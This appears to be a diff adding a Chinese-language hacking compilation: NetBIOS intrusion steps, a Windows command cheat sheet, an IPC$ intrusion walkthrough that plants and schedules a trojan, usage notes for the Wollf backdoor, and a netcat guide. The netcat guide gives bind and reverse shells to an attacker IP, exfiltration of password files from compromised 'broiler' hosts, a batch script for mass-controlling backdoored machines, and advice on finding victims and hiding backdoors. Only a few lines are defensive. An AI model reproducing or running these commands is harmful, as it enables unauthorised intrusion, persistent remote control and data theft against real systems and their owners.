@@ -1,0 +1,632 @@
+简单的网络入侵法 
+
+
+1.取得对方IP地址如XX.XX.XX.XX，方法太多不细讲了。  
+
+
+2.判断对方上网的地点，开个DOS窗口键入 TRACERT XX.XX.XX.XX  
+
+
+第4和第5行反映的信息既是对方的上网地点。  
+
+
+3.得到对方电脑的名称，开个DOS窗口键入 NBTSTAT -A XX.XX.XX.XX  
+
+
+第一行是对方电脑名称  
+
+
+第二行是对方电脑所在工作组  
+
+
+第三行是对方电脑的说明  
+
+
+4.在Windows目录下有一文件名为LMHOSTS.SAM，将其改名为LMHOSTS，删除其内容，将对方的IP及电脑名按以下格式写入文件：  
+
+
+XX.XX.XX.XX 电脑名  
+
+
+5.开DOS窗口键入 NBTSTAT -R  
+
+
+6.在开始-查找-电脑中输入对方电脑名，出现对方电脑点击即可进入。  
+
+
+以上方法请不要乱用，本人对你用上面的方法所惹出的麻烦概不负责，请慎重。  
+
+
+1.最基本，最常用的，测试物理网络的  
+
+　　ping 192.168.0.8 －t ，参数－t是等待用户去中断测试  
+
+     2.查看DNS、IP、Mac等  
+
+　　A.Win98：winipcfg  
+　　B.Win2000以上：Ipconfig/all  
+
+　　C.NSLOOKUP：如查看河北的DNS  
+　　C:\>nslookup  
+　　Default Server: ns.hesjptt.net.cn  
+　　Address: 202.99.160.68  
+　　>server 202.99.41.2 则将DNS改为了41.2  
+　　> pop.pcpop.com  
+　　Server: ns.hesjptt.net.cn  
+　　Address: 202.99.160.68  
+
+　　Non-authoritative answer:  
+　　Name: pop.pcpop.com  
+　　Address: 202.99.160.212  
+
+     3.网络信使   
+
+　　Net send 计算机名/IP　* (广播) 传送内容，注意不能跨网段  
+　　net stop messenger 停止信使服务，也可以在面板－服务修改  
+　　net start messenger 开始信使服务  
+
+     4.探测对方对方计算机名，所在的组、域及当前用户名 （追捕的工作原理）  
+
+　　ping －a IP －t ，只显示NetBios名  
+　　nbtstat -a 192.168.10.146 比较全的  
+
+     5.netstat -a 显示出你的计算机当前所开放的所有端口  
+
+　　netstat -s -e 比较详细的显示你的网络资料，包括TCP、UDP、ICMP 和 IP的统计等  
+
+     6.探测arp绑定（动态和静态）列表，显示所有连接了我的计算机，显示对方IP和MAC地址  
+
+　　arp -a  
+
+     7.在代理服务器端  
+
+　　捆绑IP和MAC地址，解决局域网内盗用IP！：  
+　　ARP －s 192.168.10.59 00 －50－ff－6c－08－75  
+　　解除网卡的IP与MAC地址的绑定：  
+　　arp -d 网卡IP  
+
+     8.在网络邻居上隐藏你的计算机  
+
+　　net config server /hidden:yes  
+　　net config server /hidden:no 则为开启  
+
+     9.几个net命令  
+
+　　A.显示当前工作组服务器列表 net view，当不带选项使用本命令时，它就会显示当前域或网络上的计算机上的列表。  
+　　比如：查看这个IP上的共享资源，就可以  
+　　C:\>net view 192.168.10.8  
+　　在 192.168.10.8 的共享资源  
+　　资源共享名 类型 用途 注释  
+　　--------------------------------------  
+　　网站服务 Disk  
+　　命令成功完成。  
+
+　　B.查看计算机上的用户帐号列表 net user  
+　　C.查看网络链接 net use  
+　　例如：net use z: \192.168.10.8\movie 将这个IP的movie共享目录映射为本地的Z盘  
+　　D.记录链接 net session  
+　　例如: C:\>net session  
+　　计算机 用户名 客户类型 打开空闲时间  
+　　-------------------------------------------------------------------------------  
+　　\192.168.10.110 ROME Windows 2000 2195 0 00:03:12  
+
+　　\192.168.10.51 ROME Windows 2000 2195 0 00:00:39  
+　　命令成功完成。  
+
+     10.路由跟踪命令  
+
+　　A.tracert pop.pcpop.com  
+　　B.pathping pop.pcpop.com 除了显示路由外，还提供325S的分析，计算丢失包的％  
+
+     11.关于共享安全的几个命令  
+　　A.查看你机器的共享资源 net share  
+　　B.手工删除共享（可以编个bat文件，开机自运行，把共享都删了！）  
+　　net share c$ /d  
+　　net share d$ /d  
+　　net share ipc$ /d  
+　　net share admin$ /d  
+　　注意$后有空格。  
+　　C.增加一个共享：  
+　　c:\net share mymovie=e:\downloads\movie /users:1  
+　　mymovie 共享成功。  
+　　同时限制链接用户数为1人。  
+
+     12.在DOS行下设置静态IP  
+
+　　A.设置静态IP  
+　　CMD  
+　　netsh  
+　　netsh>int  
+　　interface>ip  
+　　interface ip>set add "本地链接" static IP地址 mask gateway  
+　　B.查看IP设置  
+　　interface ip>show address  
+
+　　Arp  
+　　显示和修改“地址解析协议 (ARP)”缓存中的项目。ARP 缓存中包含一个或多个表，它们用于存储 IP 地址及其经过解析的以太网或令牌环物理地址。计算机上安装的每一个以太网或令牌环网络适配器都有自己单独的表。如果在没有参数的情况下使用，则 arp 命令将显示帮助信息。  
+
+　　语法  
+　　arp [-a [InetAddr] [-N IfaceAddr]] [-g [InetAddr] [-N IfaceAddr]] [-d InetAddr [IfaceAddr]] [-s    InetAddr EtherAddr [IfaceAddr]]  
+
+　　参数  
+　　-a [InetAddr] [-N IfaceAddr]  
+　　显示所有接口的当前 ARP 缓存表。要显示指定 IP 地址的 ARP 缓存项，请使用带有 InetAddr 参数的 arp -a，此处的 InetAddr 代表指定的 IP 地址。要显示指定接口的 ARP 缓存表，请使用 -N IfaceAddr 参数，此处的 IfaceAddr 代表分配给指定接口的 IP 地址。-N 参数区分大小写。  
+　　-g [InetAddr] [-N IfaceAddr]  
+　　与 -a 相同。  
+　　-d InetAddr [IfaceAddr]  
+　　删除指定的 IP 地址项，此处的 InetAddr 代表 IP 地址。对于指定的接口，要删除表中的某项，请使用 IfaceAddr 参数，此处的 IfaceAddr 代表分配给该接口的 IP 地址。要删除所有项，请使用星号 (*) 通配符代替 InetAddr。  
+　　-s InetAddr EtherAddr [IfaceAddr]  
+　　向 ARP 缓存添加可将 IP 地址 InetAddr 解析成物理地址 EtherAddr 的静态项。要向指定接口的表添加静态 ARP 缓存项，请使用 IfaceAddr 参数，此处的 IfaceAddr 代表分配给该接口的 IP 地址。  
+　　/?  
+　　在命令提示符显示帮助。  
+　　注释  
+　　InetAddr 和 IfaceAddr 的 IP 地址用带圆点的十进制记数法表示。  
+　　物理地址 EtherAddr 由六个字节组成，这些字节用十六进制记数法表示并且用连字符隔开（比如，00-AA-00-4F-2A-9C）。  
+　　通过 -s 参数添加的项属于静态项，它们不会 ARP 缓存中超时。如果终止 TCP/IP 协议后再启动，这些项会被删除。要创建永久的静态 ARP 缓存项，请在批处理文件中使用适当的 arp 命令并通过“计划任务程序”在启动时运行该批处理文件。  
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。  
+　　范例  
+　　要显示所有接口的 ARP 缓存表，可键入：  
+
+　　arp -a  
+
+　　对于指派的 IP 地址为 10.0.0.99 的接口，要显示其 ARP 缓存表，可键入：  
+
+　　arp -a -N 10.0.0.99  
+
+　　要添加将 IP 地址 10.0.0.80 解析成物理地址 00-AA-00-4F-2A-9C 的静态 ARP 缓存项，可键入：  
+
+　　arp -s 10.0.0.80 00-AA-00-4F-2A-9C  
+
+　　At  
+　　计划在指定时间和日期在计算机上运行命令和程序。at 命令只能在“计划”服务运行时使用。如果在没有参数的情况下使用，则 at 列出已计划的命令。  
+
+　　语法  
+　　at [\ComputerName] [{[ID] [/delete]　/delete [/yes]}]  
+
+　　at [[\ComputerName] hours:minutes [/interactive] [{/every:date[,...]　/next:date[,...]}] command]  
+
+　　参数  
+　　 \computername  
+　　指定远程计算机。如果省略该参数，则 at 计划本地计算机上的命令和程序。
+　　ID  
+　　指定指派给已计划命令的识别码。  
+　　/delete  
+　　取消已计划的命令。如果省略了 ID，则计算机中所有已计划的命令将被取消。  
+　　/yes  
+　　删除已计划的事件时，对来自系统的所有询问都回答“是”。  
+　　hours:minutes  
+　　指定命令运行的时间。该时间用 24 小时制（即从 00:00 [午夜] 到 23:59）的 小时: 分钟格式表示。  
+　　/interactive  
+　　对于在运行 command 时登录的用户,允许 command 与该用户的桌面进行交互。  
+　　/every:  
+　　在每个星期或月的指定日期（例如，每个星期四，或每月的第三天）运行 command 命令。  
+　　date  
+　　指定运行命令的日期。可以指定一周的某日或多日（即，键入 M、T、W、Th、F、S、Su）或一个月中的某日或多日（即，键入从 1 到31 之间的数字）。用逗号分隔多个日期项。如果省略了 date，则 at 使用该月的当前日。  
+　　/next:  
+　　在下一个指定日期（比如，下一个星期四）到来时运行 command。  
+　　command  
+　　指定要运行的 Windows 命令、程序（.exe 或 .com 文件）或批处理程序（.bat 或 .cmd 文件）。当命令需要路径作为参数时，请使用绝对路径，也就是从驱动器号开始的整个路径。如果命令在远程计算机上，请指定服务器和共享名的通用命名协定 (UNC) 符号，而不是远程驱动器号。  
+　　/?  
+　　在命令提示符显示帮助。  
+　　注释  
+　　Schtasks 是功能更为强大的超集命令行计划工具，它含有 at 命令行工具中的所有功能。对于所有的命令行计划任务，都可以使用 schtasks 来替代 at。有关 schtasks 的详细信息，请参阅“相关主题”。  
+
+　　使用 at  
+　　使用 at 命令时，要求您必须是本地 Administrators 组的成员。 
+
+
+开始-运行-输入: 
+gpedit.msc-----组策略 
+sndrec32-------录音机 
+Nslookup-------IP地址侦测器 
+explorer-------打开资源管理器 
+logoff---------注销命令 
+tsshutdn-------60秒倒计时关机命令 
+lusrmgr.msc----本机用户和组 
+services.msc---本地服务设置 
+oobe/msoobe /a----检查XP是否激活 
+notepad--------打开记事本 
+cleanmgr-------垃圾整理 
+net start messenger----开始信使服务 
+compmgmt.msc---计算机管理 
+net stop messenger-----停止信使服务 
+conf-----------启动 netmeeting 
+dvdplay--------DVD播放器 
+charmap--------启动字符映射表 
+diskmgmt.msc---磁盘管理实用程序 
+calc-----------启动计算器 
+dfrg.msc-------磁盘碎片整理程序 
+chkdsk.exe-----Chkdsk磁盘检查 
+devmgmt.msc--- 设备管理器 
+regsvr32 /u *.dll----停止dll文件运行 
+drwtsn32------ 系统医生 
+rononce -p ----15秒关机 
+dxdiag---------检查DirectX信息 
+regedt32-------注册表编辑器 
+Msconfig.exe---系统配置实用程序 
+rsop.msc-------组策略结果集 
+mem.exe--------显示内存使用情况 
+regedit.exe----注册表 
+winchat--------XP自带局域网聊天 
+progman--------程序管理器 
+winmsd---------系统信息 
+perfmon.msc----计算机性能监测程序 
+winver---------检查Windows版本 
+sfc /scannow-----扫描错误并复原 
+taskmgr-----任务管理器（2000／xp／2003） 
+
+*net user 查看用户列表 
+*net user 用户名 密码 /add 添加用户 
+*net user 用户名 密码 更改用户密码 
+*net localgroup administrators 用户名 /add 添加用户到管理组 
+*net user 用户名 /delete 删除用户 
+*net user 用户名 查看用户的基本情况 
+*net user 用户名 /active:no 禁用该用户 
+*net user 用户名 /active:yes 启用该用户 
+
+*net share 查看计算机IPC$共享资源 
+*net share 共享名 查看该共享的情况 
+*net share 共享名=路径 设置共享。例如 net share c$=c: 
+*net share 共享名 /delete 删除IPC$共享 
+
+*net use 查看IPC$连接情况 
+
+*net use \\ip\ipc$ "密码" /user:"用户名" ipc$连接 
+
+*net time \\ip 查看远程计算机上的时间 
+
+*copy 路径:\文件名 \\ip\共享名 复制文件到已经ipc$连接的计算机上 
+
+*net view ip 查看计算机上的共享资源 
+
+*ftp 服务器地址 进入FTP服务器 
+
+*at 查看自己计算机上的计划作业 
+*at \\ip 查看远程计算机上的计划作业 
+*at \\ip 时间 命令(注意加盘符) 在远程计算机上加一个作业 
+*at \\ip 计划作业ID /delete 删除远程计算机上的一个计划作业 
+*at \\ip all /delete 删除远程计算机上的全部计划作业 
+
+
+
+ipc$共享入侵  
+
+微软在win2000，xp中设置的这个功能对个人用户来说几乎毫无用处。反而成了黑客入侵nt架构操作系统的一条便利通道。如果你的操作系统存在不安全的口令，那就更可怕了。一条典型的入侵流程如下：  
+
+（1）用任何办法得到一个帐户与口令（猜测，破解），网上流传有一个叫做smbcrack的软件就是利用ipc$来破解帐户口令的。如果你的密码位数不高，又很简单，是很容易被破解的。根据我的个人经验，相当多的人都将administrator的口令设为123，2003，或者干脆不设密码。  
+
+（2）使用命令net use \\xxx.xxx.xxx.xxx\ipc$“密码” /user:“用户名”建立一个有一定权限的ipc$连接。用copy trojan.exe \\xxx.xxx.xxx.xxx\admin$ 将木马程序的服务器端复制到系统目录下。 
+
+（3）用net time \\xxx.xxx.xxx.xxx 命令查看对方操作系统的时间，然后用at \\202.xxx.xxx.xxx 12：00 trojan.exe 让trojan.exe在指定时间运行。  
+
+这样一来，你的电脑就完全被黑客控制了。  
+
+应对措施：禁用server服务, Task Scheduler服务，去掉网络文件和打印机共享前的对勾(插入图1)，  
+
+当然，给自己的帐户加上强壮的口令才是最关键的。  
+
+
+Wollf remote manager v1.3, for Windows NT/2000, build 2002-01-19 
+Code by wollf, http://www.xfocus.org 
+
+扩展Telnet服务，可传输文件，可反向连接，可通过参数选择随系统启动或作为普通进程启动。 
+
+运行参数： 
+wollf [options] 
+
+[options]含义如下： 
+-install：安装wollf服务，默认参数； 
+-remove：停止并清除wollf服务； 
+-debug：调试wollf服务，用于安装失败后查看出错信息； 
+-once：作为普通进程运行，重启后不自动加载； 
+-listen [port]：监听指定端口，等待远程连接，主要用于反向连接方式； 
+-setup：对wollf.exe进行设置，包括监听端口、访问口令或设置为反向连接方式，完成后将生成wollf_new.exe，设置内容及示例见"config_howto.txt"。 
+
+运行示例： 
+"wollf" 安装并启动服务，监听默认端口7614； 
+"wollf -remove" 停止并卸载服务； 
+"wollf -debug" 无法安装服务，加-debug参数运行，以便查看失败原因； 
+"wollf -once" 作为普通进程运行，重新启动后不自动加载，指定监听2000端口； 
+"wollf -listen 2000" 监听2000端口，等待远程机器主动连接； 
+"wollf -setup" 对wollf.exe进行配置，并生成wollf_new.exe。 
+
+默认监听端口为7614，通过Telnet连接后可输入"help"查看命令列表。可通过"exit"命令断开连接，"quit"命令关闭服务，"remove"命令关闭并卸载服务。 
+若将wollf服务设置为反向连接方式，需要事先向FTP或HTTP服务器上传一个包含控制者IP地址和监听端口的文本文件，格式为"[IP]:[port]"，如"192.168.1.1:2000"，然后运行"wollf -listen 2000"等待连接。 
+建议使用nc(NetCat)作为客户端进行连接。命令参数中如有空格必须置于引号对中，如CD "My Documents"。 
+
+目前支持以下命令： 
+
+DOS 切换到MS-DOS提示符 
+DIR/LS/LIST 目录/文件列表 
+CD 进入目录 
+MD/MKDIR 创建目录 
+PWD 查看当前目录 
+COPY/CP 复制目录/文件 
+DEL/RM 删除目录/文件 
+REN 重命名文件 
+MOVE/MV 移动目录/文件 
+TYPE/CAT 查看文本内容 
+WGET 从HTTP服务器下载文件 
+
+FGET 从FTP服务器下载文件 
+FPUT 向FTP服务器上传文件 
+SHELL 通过系统SHELL(cmd.exe)执行命令，如"SHELL DIR" 
+EXEC/RUN 通过Windows API(WinExec)运行程序 
+PS 查看进程列表 
+WS 查看窗口列表 
+KILL 强行关闭进程 
+WHO/W 查看当前所有连接者IP 
+EXPORT 在新端口输出SHELL 
+TELNET 连接到其他安装本服务的机器 
+POPMSG 弹出系统对话框 
+SYSINFO 查看系统基本信息 
+SHUTDOWN 关闭系统 
+EXIT 断开当前连接 
+QUIT 断开所有连接并终止服务 
+REMOVE 卸载服务 
+VER/VERSION 版本信息 
+HELP/H/? 帮助信息 
+
+
+nc.exe高级技巧应用汇总 
+
+文章作者：zhoutree  
+
+0. 写在前面的话 
+1. Netcat 1.10 for NT - nc11nt.zip,原始英文信息 
+2. Netcat 1.10 for NT 帮助信息 
+3. Netcat 1.10 常用的命令格式 
+4. 管理肉鸡,更改肉鸡设置 
+5. 下载连接 
+6. 后记 
+
+###################################################################### 
+0. 写在前面的话 
+###################################################################### 
+最近工作比较空闲，老是想着怎么自动telnet肉鸡，自动执行命令。来管理自己的肉鸡。 
+自己写一个程序。功底是不够的,所以只有看了看nc的帮助信息,虽然只看了个半懂, 
+但是借助于金山词霸2002版本, 还是明白了一点东西. 
+我觉的有必要再总结一下.反正主要是满足我自己的需要. 
+
+###################################################################### 
+1. Netcat 1.10 for NT - nc11nt.zip 
+###################################################################### 
+Basic Features 
+
+* Outbound or inbound connections, TCP or UDP, to or from any ports 
+* Full DNS forward/reverse checking, with appropriate warnings 
+* Ability to use any local source port 
+* Ability to use any locally-configured network source address 
+* Built-in port-scanning capabilities, with randomizer 
+* Can read command line arguments from standard inputb 
+* Slow-send mode, one line every N seconds 
+* Hex dump of transmitted and received data 
+* Ability to let another program service established 
+connections 
+* Telnet-options responder 
+
+New for NT 
+
+* Ability to run in the background without a console window 
+* Ability to restart as a single-threaded server to handle a new 
+connection 
+________________________________________________________________________ 
+Some of the features of netcat are:  
+
+Outbound or inbound connections, TCP or UDP, to or from any ports  
+Full DNS forward/reverse checking, with appropriate warnings  
+Ability to use any local source port  
+Ability to use any locally-configured network source address  
+Built-in port-scanning capabilities, with randomizer  
+Built-in loose source-routing capability  
+Can read command line arguments from standard input  
+Slow-send mode, one line every N seconds  
+Optional ability to let another program service inbound connections  
+
+Some of the potential uses of netcat:  
+
+Script backends  
+Scanning ports and inventorying services  
+Backup handlers  
+File transfers  
+Server testing and simulation  
+Firewall testing  
+Proxy gatewaying  
+Network performance testing  
+Address spoofing tests  
+Protecting X servers  
+1001 other uses you`ll likely come up with  
+
+Netcat + Encryption = Cryptcat 
+
+对比win2000微软的telnet.exe和微软的tlntsvr.exe服务,连接的时候就可以看出来了. 
+1.1 NC.EXE是一个非标准的telnet客户端程序
+1.2 还有一个putty.exe客户端程序,提供四种连接模式 
+-raw -telnet -rlogin -ssh. 
+
+###################################################################### 
+2. Netcat 1.10 for NT 帮助信息 
+###################################################################### 
+C:\WINDOWS\Desktop>nc -h 
+[v1.10 NT] 
+connect to somewhere: nc [-options] hostname port[s] [ports] ... 
+listen for inbound: nc -l -p port [options] [hostname] [port] 
+options: 
+-d detach from console, background mode (后台模式) 
+-e prog inbound program to exec [dangerous!!] 
+-g gateway source-routing hop point[s], up to 8 
+-G num source-routing pointer: 4, 8, 12, ... 
+-h this cruft (本帮助信息) 
+-i secs delay interval for lines sent, ports scanned (延迟时间) 
+-l listen mode, for inbound connects (监听模式,等待连接) 
+-L listen harder, re-listen on socket close (连接关闭后,仍然继续监听) 
+-n numeric-only IP addresses, no DNS (ip数字模式,非dns解析) 
+-o file hex dump of traffic (十六进制模式输出文件,三段)  
+-p port local port number (本地端口) 
+-r randomize local and remote ports (随机本地远程端口) 
+-s addr local source address (本地源地址) 
+-t answer TELNET negotiation 
+-u UDP mode 
+-v verbose [use twice to be more verbose] (-vv 更多信息) 
+-w secs timeout for connects and final net reads 
+-z zero-I/O mode [used for scanning] (扫描模式,-vv) 
+port numbers can be individual or ranges: m-n [inclusive] 
+
+###################################################################### 
+3. Netcat 1.10 常用的命令格式 
+###################################################################### 
+下面引用 《沉睡不醒 10月15日凌晨》的文章的部分。 
+
+3.1.端口的刺探： 
+nc -vv ip port 
+RIVER [192.168.0.198] 19190 (?) open //显示是否开放open 
+3.2.扫描器 
+nc -vv -w 5 ip port-port port 
+nc -vv -z ip port-port port 
+这样扫描会留下大量的痕迹，系统管理员会额外小心 
+
+3.3. 后门 
+victim machine: //受害者的机器 
+nc -l -p port -e cmd.exe //win2000 
+nc -l -p port -e /bin/sh //unix,linux 
+attacker machine: //攻击者的机器. 
+nc ip -p port //连接victim_IP,然后得到一个shell。 
+
+
+3.4.反向连接 
+attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击. 
+//或者wollf的反向连接. 
+nc -vv -l -p port  
+victim machine: 
+nc -e cmd.exe attacker ip -p port 
+nc -e /bin/sh attacker ip -p port 
+
+或者： 
+attacker machine: 
+nc -vv -l -p port1 /*用于输入*/ 
+nc -vv -l -p prot2 /*用于显示*/ 
+victim machine: 
+nc attacker_ip port1 | cmd.exe | nc attacker_ip port2 
+nc attacker_ip port1 | /bin/sh | nc attacker_ip port2 
+
+139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP） 
+这样就可以保证nc.exe优先于NETBIOS。  
+
+
+3.5.传送文件： 
+3.5.1 attacker machine <-- victim machine //从肉鸡拖密码文件回来. 
+nc -d -l -p port < path\filedest 　　　 /*attacker machine*/ 可以shell执行 
+nc -vv attacker_ip port > path\file.txt /*victim machine*/ 需要Ctrl+C退出 
+//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C. 
+
+3.5.2 attacker machine --> victim machine //上传命令文件到肉鸡 
+nc －vv -l -p port > path\file.txt　　　　　 /*victim machine*/ 需要Ctrl+C退出 
+nc -d victim_ip port < path\filedest 　 /*attacker machine*/ 可以shell执行 
+   //这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆. 
+
+结论: 可以传输ascii,bin文件.可以传输程序文件. 
+
+问题:连接某个ip后,传送完成后,需要发送Ctrl+C退出nc.exe . 
+或者只有再次连接使用pskill.exe 杀掉进程.但是是否释放传输文件打开的句柄了? 
+
+
+3.6 端口数据抓包. 
+nc -vv -w 2 -o test.txt www.xfocus.net 80 21-15 
+
+< 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error 
+< 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command "" unr 
+< 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized... 
+< 00000084 83 00 00 01 8f # ..... 
+
+
+3.7 telnet,自动批处理。 ★★★★★我要重点推荐的东西就是这个. 
+nc victim_ip port < path\file.cmd 　 /*victim machine*/ 显示执行过程. 
+nc -vv victim_ip port < path\file.cmd 　 /*victim machine*/ 显示执行过程. 
+
+nc -d victim_ip port < path\file.cmd 安静模式. 
+
+_______________file.cmd________________________ 
+password 
+cd %windir% 
+echo []=[%windir%] 
+c: 
+cd \ 
+md test 
+cd /d %windir%\system32\ 
+net stop sksockserver 
+snake.exe -config port 11111 
+net start sksockserver 
+exit 
+_______________file.cmd__END___________________ 
+
+###################################################################### 
+4. 管理肉鸡,更改肉鸡设置 
+###################################################################### 
+4.1 比如要统一更改肉鸡上面的代理端口.snake.exe 修改为11111 服务名称"sksockserver" 
+使用winshell后门. 端口1234 密码password 
+命令格式就是 
+modi.bat youip.txt 
+
+___________modi.bat____________________________ 
+@if "%1"=="" echo Error: no ip.txt &&goto END 
+
+:start 
+@echo password >a.cmd 
+@echo s >>a.cmd 
+@echo cd /d %%windir%%\system32\ >>a.cmd 
+@net stop "sksockserver" >>a.cmd 
+@snake.exe -config port 11111 >>a.cmd 
+@net start "sksockserver" >>a.cmd 
+@exit >>a.cmd 
+
+:auto 
+@for /f "eol=; tokens=1,2" %%i in (%1) do @(nc.exe -vv -w 3 %%i 1234 < a.cmd) 
+
+:END 
+___________modi.bat__END_______________________ 
+
+
+4.2 
+
+@echo off 
+color f0 
+:start 
+cls 
+C:\nc -vv -w 3 -l -p 80>>80.txt 
+goto start 
+把防火墙关掉以后运行这个批处理，会监听到许多探测U漏洞的信息，大多 
+是三条一组--妮姆达病毒扫描你的。这样就会得到肉鸡的.虽然质量不高. 
+但是也是一种便宜的办法. 
+
+肉鸡特征： 
+1。unicode漏洞 
+2。guest密码为空，administrators组用户 
+3。其他漏洞 
+
+自己慢慢的爽去吧。不过，再次强调一句，不建议而且是不能破坏国内主机，上去以后将tftp.exe改名。然后用pskill干掉mmc.exe进程，之后是杀毒。做好后门以后，将guest帐号停用，以对付傻瓜扫描器 
+
+###################################################################### 
+5. 下载连接 
+###################################################################### 
+5.1 http://www.atstake.com/research/tools/network_utilities/ 
+Tool: Netcat 1.10 for Unix  
+Version: 03.20.96  
+Platforms: *nix 
+
+Tool: Netcat 1.1 for Win 95/98/NT/2000  
+Version: 02.08.98  
+Platforms: Runs on Win 95/98/NT/2000  
+
+
+5.2 http://www.xfocus.net/download.php?id=320  
+名称： cryptcat_nt.zip 更新时间： 2002-04-05  
+类别： 网络工具 平台： Win9x/NT/2000 大小： 115.8K 提交： maxilaw  
+简介： 加密传输的nc。  
+
+5.3 http://content.443.ch/pub/security/blackhat/Networking/nc/ 国外的网站 
+10.03.02 15:48 1305 cryptcat.txt 
+10.03.02 15:48 245760 cryptcat_linux2.tar 
+10.03.02 15:48 118533 cryptcat_nt.zip  
+
+ 
+
